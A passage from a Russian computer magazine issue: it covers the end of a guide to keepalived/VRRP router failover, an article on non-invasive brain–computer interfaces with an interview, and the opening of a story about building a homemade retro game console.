 tcpdump ‐vvv ‐ni eth0 vrrp. Когда мы запустим на нем keepalived, мы
 получим там такую картину:


 192.0.2.2 > 224.0.0.18: vrrp 192.0.2.2 > 224.0.0.18:
     VRRPv2, Advertisement, vrid 10, prio 100, authtype none, intvl 1s
 , length 20, addrs: 192.0.2.254
     06:27:47.495833 IP (tos 0xc0, ttl 255, id 410, offset 0, flags [
 none], proto VRRP (112), length 40)
 192.0.2.2 > 224.0.0.18: vrrp 192.0.2.2 > 224.0.0.18:
     VRRPv2, Advertisement, vrid 10, prio 100, authtype none, intvl 1s
 , length 20, addrs: 192.0.2.254
     06:27:48.133070 IP (tos 0xc0, ttl 255, id 1, offset 0, flags [
 none], proto VRRP (112), length 40)
 192.0.2.1 > 224.0.0.18: vrrp 192.0.2.1 > 224.0.0.18:
     VRRPv2, Advertisement, vrid 10, prio 200, authtype none, intvl 1s
 , length 20, addrs: 192.0.2.254
     06:27:49.133266 IP (tos 0xc0, ttl 255, id 2, offset 0, flags [
 none], proto VRRP (112), length 40)
 192.0.2.1 > 224.0.0.18: vrrp 192.0.2.1 > 224.0.0.18:
     VRRPv2, Advertisement, vrid 10, prio 200, authtype none, intvl 1s
 , length 20, addrs: 192.0.2.254
     06:27:50.133343 IP (tos 0xc0, ttl 255, id 3, offset 0, flags [
 none], proto VRRP (112), length 40)

 Как видим, rtr‐backup отправлял пакеты VRRP, пока не получил пакет от rtr‐
 master с большим приоритетом. В этот момент он перестал отправлять
 пакеты и перешел в сос тояние backup. Соответственно, rtr‐master прис‐
 воил себе адрес 192.0.2.254.
   Как можно узнать сос тояние VRRP не по косвенным признакам? Эта воз‐
 можность присутствует в keepalived, но, к сожалению, в дистрибути вах она
 часто не включена при сборке пакета.
  • kill SIGUSR1 $(cat /var/run/keepalived.pid) для дампа дан‐
   ных о состоянии;
  • kill SIGUSR2 для дампа ста тистики;
  • kill 36 для дампа данных в фор мате JSON.

 Файлы сохраняются в /tmp/keepalived.*. Если быть точным, то дамп
 в JSON инициирует сиг нал SIGRTMIN+2, в Linux это значение равно тридцати
 шести.


 Совместимость с RFC
 По RFC 3768, кроме виртуальных адресов IP, должны использоваться еще и
 виртуальные MAC‐адреса, из диапазона 00‐00‐5E‐00‐01‐XX.
   Но при наших настрой ках, если пос мотреть еще глубже в дамп трафика,
 можно увидеть, что пакеты отправляются с физичес кого адреса самого eth0.
 В keepalived режим сов местимос ти с RFC по умол чанию отключен. Когда‐то
 давно — потому, что нужной функциональнос ти в стабильных версиях ядра
 Linux не было. Теперь причины в основном исторические, но есть и прак‐
 тическая. Поскольку у каж дой сетевой карты может быть один и только один
 MAC‐адрес, достичь совместимос ти с RFC можно, только создав виртуаль‐
 ный интерфейс. Имен но это keepalived и дела ет, но в этом слу чае правила
 netﬁlter и прочие настройки, в которых явно упомянуты имена сетевых
 интерфейсов (вроде iptables ‐I OUTPUT ‐o eth0 ‐j ACCEPT), перестанут
 применяться к интерфейсу с виртуальными адресами — имена интерфейсов
 не могут быть одинаковыми.
   Поэтому перед тем, как включать этот режим, просмотри все нас тройки
 и убедись, что они не зависят от имен интерфейсов, или продублируй их
 для виртуального интерфейса.
   Вклю чить его можно опцией use_vmac <имя  интерфейса>. Например,
 если добавить следующие строки, виртуальные адреса будут прис воены вир‐
 туальному интерфейсу eth0v10.


 vrrp_instance my‐group
 {
   use_vmac eth0v10
 }

 На практике нестандартный режим по умолчанию обычно не вызывает
 никаких проблем, разве что с системами, которые принципиально не воспри‐
 нимают gratuitous ARP (прось бу забыть связь IP‐ и MAC‐адресов), но такие
 встречаются редко.


 До пол нительные воз можности
 VRRP без multicast
 Иногда можно нарваться на сети, где multicast не работает, но организовать
 резервирование как‐то надо. Такое чаще всего бывает на интерфейсах, под‐
 клю ченных к коммутатору про вайдера.
   Выручит тебя столь же противо реча щая RFC, но вполне работоспособная
 опция unicast‐peer. В нашем случае можно добавить в vrrp_instance
 опцию unicast_peer { 192.0.2.2 } на rtr‐master и, соответственно, uni‐
 cast_peer { 192.0.2.1 } на rtr‐backup.


 Син хро низация групп
 Как ты помнишь, VRRP настраивается отдельно для каждой физической сети.
 Очевидно, работоспособ ность одной сетевой карты никак не гарантиру ет
 работоспособность всего маршру тиза тора.
    Пусть у тебя есть маршрутизатор с дву мя интерфейсами, один в локаль‐
 ную сеть, другой к провайдеру. Если соеди нение с провай дером упадет, то
 виртуальный внешний адрес перейдет к резервному маршру тизатору, но вир‐
 туальный внутренний так и останется, где был, и пакеты из локальной сети
 не пройдут дальше маршру тизатора.
   Чтобы избежать подоб ного, можно использовать sync groups. Они работа‐
 ют так: если интерфейс из одной груп пы переходит в состояние backup,
 вместе с ним перейдут и все остальные.
   Если у тебя настроены vrrp_instance с наз вани ями LAN и WAN, связать
 их в одну группу синхрониза ции можно вот так:


 vrrp_sync_group my‐sync‐group {
   group { LAN WAN }
 }


 Внеш ние скрипты
 Иногда встроенной функциональнос ти ока зывается недостаточно. В этом
 случае можно расширить ее с помощью внешних скриптов.
   Например, для тебя критичес ки важ на доступность сайта xakep.ru. Тогда
 можно создать скрипт /usr/local/bin/xakep_test.sh с ping ‐c1 xakep.
 ru и добавить в keepalived.conf следующее (не внутрь vrrp_instance):


 vrrp_script xakep_test {
   script "/config/scripts/test.sh"
   interval 60 # Выполнять раз в минуту
   fall 3 # Три неудачных выполнения считать отказом
   rise 1 # Одно удачное считать успехом
 }

 А потом добавить опцию track_script { xakep_test } (внутрь vrrp_in‐
 stance).
   Можно также выполнять скрипты при изменении состояния VRRP, опци ями
 notify_master  "/path/to/script", notify_backup  "/path/to/script"
 и  notify_fault  "/path/to/script". В  стандарте  это  не  указано,
 но keepalived позволя ет различать нормальный переход в состояние backup
 (например, из‐за preempt) и аварийный. В первом слу чае выпол няется скрипт
 из notify_backup, а во втором — из notify_fault. Это бывает полез но
 для отправ ки уведомлений админу или для применения настроек, которые
 должны быть только на основном маршрутизаторе.


 Отключаем preempt
 По умолчанию keepalived использует preempt, то есть маршрутизатор с боль‐
 шим приоритетом всегда вернет себе ста тус master пос ле возвращения
 из аварийного состояния. Если ты хочешь избежать лишних переключений,
 просто добавь nopreempt внутрь нас троек vrrp_instance.


 ЗАКЛЮЧЕНИЕ
 Надеюсь, эта статья поможет тебе стро ить отказоус тойчивые сети. Даже если
 ты используешь VRRP (и, в частности, keepalived) только в составе специали‐
 зированных  сетевых  дистрибутивов,  а  не  напрямую,  всегда  полезно
 понимать, как он работает.
GEEK
ПЕЧАТЬ
СИЛОЙ МЫСЛИ

КАК РАБОТАЮТ ИНТЕРФЕЙСЫ
МОЗГ — КОМПЬЮТЕР И НА ЧТО ОНИ
СПОСОБНЫ СЕГОДНЯ





    Александр Бурага
   Инженер‐конструктор
радиоэлектронной техники. С
   вниманием следит за
  прогрессом IoT и носимой
        электроники.
     dtp‐avb@yandex.ru





Управлять компьютером силой мысли — давняя и пока что
несбыточная мечта. Но шаги в этом направлении делаются,
и даже небольшие успехи в разработке нейроинтерфейсов
открывают воз можности, мощно отда ющие киберпанком.
В этой статье мы разберемся, чего наука чтения мыслей
достигла на сегод няшний день, и узна ем, как конкретно
реализуются неинвазив ные методы.


С ЧЕГО ВСЕ НАЧИНАЛОСЬ
Интерес к изучению моз га техничес кими методами возник сравнительно
недавно — примерно на рубеже XIX и XX веков. В 1920‐х годах исследователь
Эдгар Эдриан предположил, что нейроны генерируют электрические импуль‐
сы и служат базовым элементом куда более сложной структуры. Поз же До‐
нальд Хебб разработал (1949) теорию пластичнос ти синаптической передачи
и нейронных ансамблей, что перевернуло представление об обязанностях,
«закрепленных» за конкретными областя ми коры головного мозга. Ока‐
залось, что при необ ходимос ти нейроны охотно меня ют свои функции и нель‐
зя выделить  какую‐то одну  группу, отвечающую, например, за навыки
информационной безопас ности.
  В 1960‐х в лаборатории нейронального контроля Национального инсти‐
тута здоровья США впервые попытались записать и обработать электричес‐
кий сигнал с нейронов подопытной обезь яны. Пару десятилетий спустя эта же
группа ученых экспериментировала с ана лизом моз говой деятельнос ти уже
в реальном вре мени, позволяя пациентам зажигать лампочки све тового таб‐
ло «силой мысли». Открывшиеся воз можнос ти окрылили исследователей,
и варианты прикладных применений не заставили себя дол го ждать. Первая
научная статья, описывающая успешные эксперименты с «виртуальной кла‐
виатурой» для парализованных людей, вышла в 1999 году (Нилс Бирбаумер).
   Увы, мыслительные процессы человека оказались устроены гораздо слож‐
нее, чем изначально предполага ли ученые. Этим объ ясняется некоторый
спад интереса к нейроинтерфейсам в начале XXI века. Однако история цик‐
лична, и сегодня многие проекты переживают второе рождение.
   Во‐первых, этому способствовал прог ресс в аппаратном обеспечении.
За последние несколько лет в продаже появились доступные по цене и отно‐
сительно мало потребляющие аналого‐цифровые преобразователи (АЦП),
которые можно успешно использовать в задачах оцифровки биологических
сигналов. Например, сигма‐дельта‐АЦП ADS1263 имеет заявленное раз‐
решение 32 бит, уровень собственных шумов порядка 7 нВ, максимальную
частоту оцифровки 38,4 кГц и полное входное сопротивление около 1 ГОм.
Эти  качества  позволя ют  использовать  микросхему  в  системах  сбора
информации без допол нительных буферных уси лителей.
  Кроме АЦП, существенно продвинулись по характеристикам инструмен‐
тальные усилители, входное сопротивление которых приближается к тера‐
омам, а коэффициент усиления сос тавля ет десятки тысяч раз. При этом собс‐
твенные токи утечек и токовый шум не превыша ют одного пикоампера, что
помогает разработчикам проектировать крайне чувстви тельные схемы съема
биопотенциалов.
  Из более очевидных вещей: произво дительность наших компьютеров
выросла в десятки раз. Не в последнюю очередь это стало возможным бла‐
годаря использованию GPU‐, FPGA‐ и ASIC‐микросхем для анализа сигналов
в реальном вре мени. Кроме того, весь ма популярная сегодня модель орга‐
низации вычислений в облаке позволяет компаниям легко арендовать необ‐
ходимые мощности, концентрируясь на главном.
   Во‐вторых, вместе с аппаратной частью эволюционировали и возможнос‐
ти нашего программного обеспечения. Появились дружес твенные к иссле‐
дователям фреймвор ки, высокоуровневые языки программирования и мно‐
гочисленные спо собы визу ализации и классифика ции информации. Нап‐
ример, сегодня с помощью нейросети можно легко отслеживать возника‐
ющие события и корреляцию даже в зашумленных рядах данных.
  Ниже на рисунке изображены основные груп пы алгоритмов, которые
используются для поиска особен ностей сигнала в реальном времени.





Что касается основного источника информа ции для интерфейса «мозг —
компьютер», то тут особых изменений не произош ло. Сегодня наиболее час‐
то используются сигналы с электроэнцефалограмм. Альтернативным спо‐
собом может быть функциональная магнитно‐резонансная томография (fMRI)
и магнитоэнцефалография. Однако, как ты понимаешь, разработать компак‐
тный томограф практически невоз можно, а многомиллионная стоимость
готовых аппаратов ограничивает их использование только крупными кол‐
лективами в компаниях и институтах.


НЕЙРОИНТЕРФЕЙСЫ СЕГОДНЯ
Снятие сигналов ЭЭГ, как и любых других малых аналоговых сигналов, —
задача весьма непростая: их характеристики нестационарны, они подверже‐
ны внешнему шуму и могут влиять друг на дру га. Существующие на данный
момент проекты клавиатур и про чих устрой ств ввода пред полагают исполь‐
зование внешнего стимула. Воз никающий ответный отклик и будет улав‐
ливаться сенсорной частью BCI (Brain Computer Interface). Согласись, гораз‐
до проще установить событие, когда ты точно зна ешь, когда именно оно дол‐
жно было произойти. :)
  В общем случае стимулы можно разделить на две основные группы. Event
Related Potentials (ERPs) — это сигналы мозга, генерируемые в ответ на ощу‐
щаемые или когнитивные события (громкий звук, резкий запах). А Visualy
Evoked Potentials (VEPs) — это сигналы, подкрепленные каким‐либо визуаль‐
ным воздействием.
  Думаю, проще пояснить на примерах: когда у человека стоит задача выб‐
рать один предмет из многих изображенных, работает принцип ERP. В ответ
на нужный стимул с определенной задержкой воз никает хорошо регистри‐
руемый системами ЭЭГ однократ ный сигнал. Если же в область внимания
человека попадает мерцающий с определен ной интенсивностью графичес‐
кий объект и есть возможность захватить переменный сигнал от электродов
на соответствующей час тоте — это система VEP.
  Наиболее широко используется сегодня метод SSVEP (Steady State VEP).
Это такой формат визуальной клавиатуры, в котором каждому элементу соот‐
ветствует своя уникальная частота мерцания. Поль зователь при этом ими‐
тирует нажатие кнопки с помощью фокуси ровки внимания на нужном ком‐
поненте интерфейса.





Как правило, активность участков моз га в ЭЭГ принято делить по наблюда‐
емой частоте (в герцах): дельта (f<=4), тета (4<f<=8), альфа (8<f<=12), бета
(12<f<=30) и гамма (f>30). Для ана лиза сигналов челове ческой моторики (в
том числе движений пальцев при наборе на кла виату ре) используется
в основном анализ альфа‐ и бета‐активности.
  Впрочем, не все так просто. Качес тво снимаемых электроэнцефалограмм
сильно зависит от множества сторонних факторов, вплоть до состояния здо‐
ровья и текущего настроения человека. Поэтому многие реально существу‐
ющие системы часто не только подгоняют под конкретного пользовате ля,
но и обязательно калибруют время от времени.


КАК ВСЕ ЭТО РАБОТАЕТ?
Человеческий мозг — очень сложная шту ка, даже если это мозг очередного
скрипт‐кидди. И соединить его напрямую с компьютером в ближайшие лет
двадцать точно не получится (хотя в случае выше это, возможно, и к лучшему).
Для того чтобы имитировать функции обычной клавиатуры, придется сперва
обзавестись устрой ством, выдающим определенные стимулы. Здесь сгодит‐
ся любой экран — например, отживший свое монитор.
  Кроме того, нужна будет система сбора информации. Их делят на две
категории: инвазив ные и (сюрприз!) неин вазивные. Первые предполагают
непосредственное внед рение электродов в области головного моз га и тре‐
буют хирургического вмешательства, тогда как вторые позволяют оценивать
биопотенциалы удален но и дос тупны почти всем желающим.


             INFO

                     На самом деле, несмотря на все сложности и луч‐
                    шее соотношение сигнал — шум, инвазивные сис‐
                     темы не предоставляют каких‐то существенных
                      преимуществ по сравнению с неинвазивными.
                     Современные исследования не подтвердили воз‐
                      можность  извлечь мысленные  образы  из‐под
                       череп ной коробки, поэтому шапочку из фольги
                    можешь если и не выбросить, то хотя бы отло‐
                       жить на дальнюю полку.


Сегодня существует много устройств, которые можно использовать в качес‐
тве простейших нейроин терфейсов. Очень популярна платформа OpenBCI,
которая позволяет исследователям не только собирать аппаратные стенды
для получения биосигналов (16 каналов), но и анализировать их при помощи
собственного фреймворка. Он содержит большинство современных методов
фильтрации и выявления характерных особенностей в оцифрованных данных.





Кроме того, на сегодняшний день именно OpenBCI — крупнейшее сообщес‐
тво людей, увлекающихся нейроин терфейсами как в качестве хобби, так
и профессионально. В их онлайн‐магазине ты можешь купить все необ‐
ходимое для своих опытов, начиная от «сухих» электродов и заканчивая серь‐
езными платами с усилителями различных биосигналов.
   Также есть интересные альтернативные разработ ки, вроде FreeEEG, под‐
держивающего до 32 каналов, и E‐motiv EPOC с 14 каналами.
  Отдельно стоит отметить проект НейроЧат, в работе над которым при‐
нимал участие заведующий лабораторией нейрофизиологии МГУ Александр
Яковлевич Каплан. Его устройство позволяет людям с нарушенными мотор‐
ными функциями общаться в мес сенджерах и соцсетях. Скорость ввода сей‐
час составляет порядка десяти символов в минуту, однако команда планирует
добиться радикального ускорения с помощью новых способов: отказа от мат‐
ричного представ ления в пользу груп пировки по признакам, сокращения
набора элементов и использования нативного автодопол нения.





             INFO

                        Кстати, если ты, прочитав эту статью, захотел
                      собрать собственный полиграф (детектор лжи)
                       на основе перечисленных нейроин терфейсов, то
                      обрати внимание, что такие эксперименты уже
                      проводились, но без какого‐либо положи тельного
                        результата. Выяснилось лишь, что ложь — штука
                       очень индивидуальная и более‐менее определен‐
                      но судить о достоверности ответов по возбужде‐
                    нию тех или иных зон мозга испытуемого можно
                     лишь после тщательной индивидуальной настрой‐
                           ки. А это, сам понимаешь, почти всегда не вари‐
                           ант.



МЕТОД P300
Теперь рассмот рим несколько полезных способов, которые облегчают вза‐
имодействие человека с компь ютером по нейроинтерфейсам. Самый извес‐
тный такой способ — P300 — представляет собой сумму компонентов P3a
и P3b, из‐за чего и получил свое наз вание. Именно на его основе работают
многие современные BCI.





Представь себе, что во время эксперимента тебя попросили наблюдать
за вклю чением лампочки крас ного цвета на елочной гирлянде. Если при этом
регистрировать электричес кую активность в срединно‐лобно‐центральной
части головного мозга, то мы бы увидели чет кие отклики на заданный стимул
и смазанные на ложные.





Все дело в том, что ког да в поле зрения человека попадает объект инте реса,
то примерно через 250–500 мс в областях P3a и P3b возникает характерный
импульс с амплитудой порядка 10 мкВ, хорошо раз личимый современным
оборудованием. В боль шинстве систем для надежной регистрации выз‐
ванных потенциалов достаточно око ло шести или семи электродов: одного
референсного и нескольких дополнительных, рас положенных в височных
и центральной областях головного мозга.
  В  экспериментах  с  виртуальной  клавиату рой  с  помощью  метода
P300 и математического аппарата SVM уда лось добиться скорости ввода
порядка 85 бит/мин при точности в 95%. К недос таткам метода можно
отнести невысокую скорость и необходимость полного перебора вариантов
для всех строк и стол бцов. Так, для мат рицы 6 на 6 необходимо прой‐
ти 12 циклов поиска, что даже при минимальных задержках создает ощутимый
временной лаг.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
      ПЕЧАТЬ СИЛОЙ
          МЫСЛИ
                КАК РАБОТАЮТ ИНТЕРФЕЙСЫ МОЗГ —
             КОМПЬЮТЕР И НА ЧТО ОНИ СПОСОБНЫ
                                   СЕГОДНЯ





МЕТОД SSVEP
Хорошей альтернативой P300 может быть метод SSVEP, в котором каждому
элементу на экране соответс твует своя час тота мерцания (как правило, близ‐
кая к 10 Гц). Допол нительно при этом иног да исполь зуется характерный пов‐
торяющийся паттерн. Примерно по ана логии с ортогональными кодами,
которые широко применяются в радиосвя зи стандарта CDMA и некоторых
других областях.
  В эксперименте с фреймворком EEG2Code (Sebastian Nagel, Martin Spuler,
2018) использовалась клавиатура с 32 клавишами. Данные с ЭЭГ пред‐
варительно фильтровали, пос ле чего классифици ровали в соответс твии
с моделью. В результате исследова телям удалось дос тигнуть средней точ‐
ности распознавания символов порядка 99,3% и скорости ввода око‐
ло 205 бит/мин.





А уже через год эта же команда на ана логичном оборудовании (связка из IBM
Power System S822LC и четырех ускорителей Nvidia Tesla P100) добилась впе‐
чатляющей средней скорости в 701 бит/мин (максимум — 1260 бит/мин)
при точности свыше 95%! При этом использовались 32 канала с электродами,
а классические способы обра ботки и ана лиза сигналов изменили в пользу
сверточных нейронных сетей и алго ритмов Deep Learning.
  Схожие методы — спектральный ана лиз и клас сификация через заранее
натренированные нейронные сети — выб рали и участники проекта Brain‐To‐
Brain (Renton, Mattingley, Painter, 2018). Их клавиату ра содержит меньше кла‐
виш  (28),  но  результаты  при  этом  ока зались  гораз до  скромнее —
не более 50 бит/мин.





КОМБИНИРОВАННЫЕ МЕТОДЫ
Интересным и перспективным вариантом для BCI представляется обработка
информации сразу с нес кольких каналов. Так, нейроинтерфейсы и анализ
ЭЭГ можно сочетать с картинкой от видеока мер, фиксирующих направление
взгляда пользователя.
  В работе (Yao, Ma, Wang, Zhang, Liu, Pei, Chen, 2018) описаны результаты
экспериментов по совместному использованию трекера положения взгляда
от VR‐оборудования и комплекса на основе SSVEP. Так появляется воз‐
можность сразу отбросить те символы, которые не попадают в фокус челове‐
ческого глаза. Сок ращение доступного набора элементов позволило кол‐
лективу увеличить эффективную ско рость печати и сохранить процент точ‐
ности на отличном уровне — 360 бит/мин и 98% соответс твенно.





Инва зив ный ней роин терфейс Ило на Мас ка
Интерес к нейроинтерфейсам подогрела презентация компании Neuralink,
основанной в 2016 году Илоном Маском — миллиардером, филантропом
и героем множества мемов. На первоначальном эта пе предполагается раз‐
работка носимого аппа рата инва зивного типа, который поможет парали‐
зованным людям. Однако Маск рассчитыва ет, что в дальнейшем тысячи кро‐
хотных электродов (порядка 5 мкм) в коре головного мозга расширят челове‐
ческие возможности и поз волят обмениваться информацией с компьютером
в обе стороны. Привет, трансгуманизм!





В июле 2019 года компания Neuralink поделилась результатами своей двух‐
летней деятельности: это чип N1, который представляет собой ASIC, пред‐
назначенный для первоначальной обработки сигналов от мозга, готовая сис‐
тема с полутора тысячами электродов, про тес тированная на крысах, а также
робот‐хирург, который умеет вживлять эти электро ды, не повреждая при этом
кору головного мозга. Впечатляющие дос тижения для такой молодой ком‐
пании!





Но основные вызовы еще только поджидают исследователей. Некоторые их
коллеги отме чают, что подобные «иглы» ока жутся слишком хрупкими и со вре‐
менем могут деградировать из‐за биохимических процессов в человечес ком
мозге. Кроме того, даже такие электроды все равно слишком большие
для анализа информации с отдельных нейронов.
   Какая судьба ждет эту амбициоз ную раз работку, сейчас сказать трудно.
И дело не только в технических сложностях — многих вол нует этичность
такого вмешательства в человеческую природу. Не при ведет ли это  к
еще большему социальному  неравенс тву?  Какое  отношение  к людям
с имплантами сло жится в обществе? Впрочем, говорить об этом рановато —
испытания на людях еще только впереди, и речь пока идет исключительно
о медицинских применениях.



ИНТЕРВЬЮ
По такому случаю я решил задать несколько вопросов своему старому зна‐
комому Владимиру Савинову (NoonV). Он сейчас как раз работает над ней‐
роинтерфейсами для Фонда перспективных исследований в Калининграде,
поэтому легко согласился на небольшое интервью.
  —  Сегод ня  нейроин терфейсы  часто  применяются  либо
для реабилитации людей с наруше ниями моторных фун кций,
либо в качестве раз вле чения — управляемые «силой мысли»
ушки, хвостики и про чее. Как ты думаешь, какие перспек тивы
ждут нейроин терфейсы в ближайшем будущем?
 — Если говорить про нейроинтерфейсы, которые потенциально могут
стать массовыми, то придется сра зу отмести раз личные варианты инвазив‐
ных технологий (то есть всех тех, которые требуют проведения процедур
вплоть до хирургических операций). Это фактически не оставляет нам
выбора, кроме электроэнцефалографии.
  Все эти «уши» и «хвос ты» следует отнести ско рее к недоразумениям, чем
к нейроинтерфейсам. В них больше уловок от маркетологов, чем труда
от разработчиков. Единс твенный электрод, который располагают на лбу поль‐
зователя (по той простой причине, что на лбу нет волос), скорее счи тывает
сигналы мышечной активнос ти, чем сигналы головного мозга.





Что же касается нейроклавиатур, то сейчас действительно есть устройства,
которые позволяют людям набирать текст «силой мысли». В основе боль‐
шинства подобных разработок лежит считыва ние сигнала ЭЭГ с выявлением
вызванного потенциала (Р300).
  На практике это выглядит так: пользователю демонстрируют таблицу с бук‐
вами, которые периодичес ки подсвечиваются. Когда человек концентрирует
внимание на определенной букве, пос ле ее выделения возникает отклик
на считываемом сигнале ЭЭГ. Чтобы повысить точность срабаты вания, эта
процедура проделывается несколько раз. Таким образом, набор текста
с использованием данной методики идет не слишком быстро, и полезна она
может быть только для полностью парализованных пациентов.
  — Очень важ ной задачей для нейроин терфейсов является
обработка дан ных и их классификация. Какие фреймворки ты
используешь и есть ли прогресс в алго ритмах за последние нес-
колько лет?
 — В нашей лаборатории мы ведем разработку в основном с помощью
языка программирования Python. Соот ветс твенно, применяются довольно
стандартные библиотеки: NumPy, SciPy (для цифровой обработки сигналов),
scikit‐learn (для классических алгоритмов машинного обучения) и Keras Ten‐
sorFlow (для искусственных нейросетей).
  На мой взгляд, основная проблема с широким распространением ней‐
роинтерфейсов состоит в недостаточном развитии используемых технологий
и вытекающих отсюда трудностях с их практичес ким внедрением. Примени‐
тельно к ЭЭГ мне нравится ана логия с заводом или стадионом, за стенами
которого ты стоишь и стараешь ся по шуму уга дать — что же именно там про‐
исходит. Приблизительно догадать ся можно, но понять что‐то конкретное
очень сложно.
  Именно поэтому та же американская DARPA в своей ис следовательской
программе N3 (Next‐Generation Nonsurgical Neurotechnology), которая ори‐
ентирована  на  разработку  высокопроизводитель ных,  дву направленных
интерфейсов мозг — компь ютер, вообще не рассматривает ЭЭГ в качестве
кандидата. Судя по дос тупной информации, они выб рали шесть направлений
малоинвазивных  технологий  (наноприемо передатчики,  акустооптический
подход и различные оптичес кие системы).
  Разумеется, прогресс в этой области есть, и в первую очередь он связан
с использованием методов машинного обучения для обработки сигналов.
Иронично, но искусственные нейросети, все это глу бокое обучение и ИИ дей‐
ствительно помогают при обработке сигналов от живых нейронов человечес‐
кого мозга.
  — По мне нию некото рых людей, инвазивные интерфейсы,
в том числе нашумевший Neurаlink Ило на Маска, — шту ка нес-
колько бессмысленная, так как большую часть фун кций мож но
успешно реализовать и неин вазивными спо собами. Как ты рас-
сматриваешь перспек тивы  «роботизации» людей,  сращивания
челове ка и компьюте ра?
 — На текущем уровне раз вития технологий — крайне сомневаюсь. Мы
еще только в начале пути и слишком многого не зна ем. Что же касается ком‐
пании Neuralink, то, на мой взгляд, основное дос тоинство представленной
разработки заключается в развитии технологий (миниатюризация оборудо‐
вания, роботизация процесса размещения электродов) и самом стремлении
к созданию носимого нейроинтерфейса.
  Но пока такое оборудование требует хирургичес ких процедур — малове‐
роятно, что оно получит широкое рас пространение. Разве что среди тех, кому
оно необходимо по медицинским соображени ям.
  —  Рассматривается  ли  для  нейроин терфейсов  обратная
задача:  например,  стимуляция моз га  для  раз вития  памяти?
Или BCI, который бы поз волил передавать физические ощу щения
от взаимо действия с удален ным пред метом?
 — Разумеется, такие задачи тоже рассматриваются, но с результатами
пока все не очень хорошо. Опять же, многое упи рается в доступные тех‐
нологии и необходимость инва зивного раз мещения электродов. Примеры
технологий неинвазивных процедур: транс кра ниаль ная стимуляция постоян‐
ным током (tDCS) и магнитная стимуляция.
  tDCS — это когда через электроды и кожу головы пропус кается ток поряд‐
ка единиц миллиампер. Некоторые исследова ния показы вают, что эта про‐
цедура действительно помога ет улучшить память и обучаемость. Магнитная
стимуляция применяется сегодня в терапевтичес ких целях. Есть примеры,
когда она использовалась в виде обратной связи в системе BCI. Для этого
мощным магнитным полем стимулирова лась затылочная область испы туемо‐
го, что приводило к возникновению ярких вспышек в сознании (фосфен).
  Однако в обоих случаях воз действие затрагивает слишком большие
области мозга, так что говорить о целенап равленном вызове «ощущений»
и положительных эффектах пока рано.
  — Реально ли сегод ня упро щение нейроин терфейсов до такой
сте пени, что бы экспе римен тировать с ними мог даже непод готов-
ленный   человек?  Например,   какое‑нибудь   «Нейроду ино»,
которое бы расширило аудиторию и популяризо вало направле ние
в массах?
 — Не вижу никаких препятс твий. К тому же про ект подобного рода уже
существует — OpenBCI. Он предлагает нес коль ко видов усилителей (на
четыре и восемь каналов), которые можно исполь зовать для самостоятель‐
ного съема сигнала ЭЭГ. Так что уже сейчас любой желающий может поп‐
робовать силы в создании собственного нейроинтерфейса.


ЗАКЛЮЧЕНИЕ
Конечно, отказываться от физичес кой клавиату ры сегодня рано. Даже лучшие
из нейроинтерфейсов пока не способ ны конкурировать с традици онны ми
способами ввода ни по скорос ти, ни по точности. Тем не менее проекты бод‐
ро развиваются, а открытый инстру ментарий и дос тупные электронные
устройства существенно расширя ют сооб щес тво людей, способных исполь‐
зовать BCI в решении практичес ких задач.
  Не спеши становиться в очередь на операцию по вживлению Neuralink.
Знание о сотнях тысяч биопотенциалов человеческого мозга бес полезно
при печати на компьютере, а развитие науки и техники рано или поздно (ско‐
рее первое) обязательно приведет к появлению коммерческих решений.
Приверженцы механических клавиатур могут и дальше благоговейно их
использовать, но лично я отка жусь от, по сути, потомка печатной машинки
без особого трепета.
GEEK

ДЕЛАЕМ ИГРОВУЮ
ПРИСТАВКУ





      InternalRegister





                         КАК Я СОБРАЛ
                     РЕТРОКОНСОЛЬ
                      В ДОМАШНИХ
                         УСЛОВИЯХ





В этой статье я расскажу, как собирал самопальную виде‐
оконсоль с нуля — вдохновившись ретроконсолями и сов‐
ременными проекта ми, но придумав свою уникальную архи‐
тек туру. Мои друзья снова и снова повторяли, что нечего
держать  этот проект  в  тайне, нужно,  мол, поделиться
с общес твенностью. Ну вот я и делюсь.


             INFO

                      Это перевод статьи Сержиу Виейры, впервые
                       опубликован ной в его блоге. Перевела Алёна
                       Георгиева.



КАК ВСЕ НАЧИНАЛОСЬ
Меня зовут Сер жиу Виейра, и я португальский парень, выросший в 80–90‐е.
Я всегда ностальгировал по ретроконсолям, особенно третьего и четвертого
поколений. Несколько лет назад я решил глубже изучить электронику и поп‐
робовать собрать свою собственную видеоконсоль. Работаю я инже нером
софта, и ранее никакого опыта работы с электроникой у меня не было — если
не считать сборки и апгрейда моего дес ктопа (что, конечно, не считается).
Но, несмотря на отсутс твие опыта, я ска зал себе: «Почему нет?», купил нес‐
колько книг и комплек тов электроники — и начал учить ся.
  Я хотел собрать консоль, похожую на те, что всегда мне нравились, —
что‐то среднее между NES и Super Nintendo или между Sega Master System
и Mega Drive. Все эти кон соли обладали CPU, кас томным виде очипом (тогда
он еще не назывался GPU) и аудиочипом — интегрированным или выделен‐
ным. Игры к ним распространялись на картриджах, которые обычно представ‐
ляли собой аппаратные рас ширения с чипом ПЗУ и иногда другими ком‐
понентами.
  Моим изначальным планом было соб рать консоль со следующими харак‐
теристиками.
 • Никакой эмуляции, все игры/программы должны запускаться на реальном
   железе — не обязательно железе «из тех времен», просто достаточно
  шустром для своих задач.
 • Настоящий ностальгический «ретрочип» про цес сора.
 • Вывод на телевизор (ана логовый сиг нал).
 • Способность произво дить звук.
 • Поддержка двух контроллеров.
 • Прокрутка фона и движущиеся спрайты.
 • Поддержка платформеров в стиле «Марио» (и, конечно, дру гих типов игр).
 • Возможность запускать игры и программы с карты SD.

Я решил использовать поддержку SD‐карт вместо картриджей, потому что
запускать игры с карты намного практичней — к тому же на нее проще
копировать файлы с компь ютера. Используй я картриджи, пришлось бы нак‐
рутить куда больше железа и завести отдельное железо для каждой прог‐
раммы.


СОБИРАЕМ КОНСОЛЬ
Видеосигнал
Начал свою работу я с генерации видеосигнала. У всех консолей эпохи,
на которую я ориентировался, были свои проп риетарные графические
чипы — что давало им очень раз ные характеристики. По этой причине я
не стал использовать готовый гра фический чип — хотелось, чтобы у моей
консоли были уникаль ные воз можности гра фики. Но, поскольку собрать
собственный чип я бы не потянул, а ПЛИС исполь зовать не умел, я выбрал
базирующийся на софте графичес кий чип с двадцатиме гагерцевым вось‐
мибитным микроконтрол лером. Это не перебор: у него ровно такая произво‐
дительность, чтобы генерировать нужный мне тип гра фики.
   Итак, я начал с микроконтроллера ATmega644, работающего на час‐
тоте 20 МГц, который посылал PAL‐сигнал на телевизор. Поскольку сам
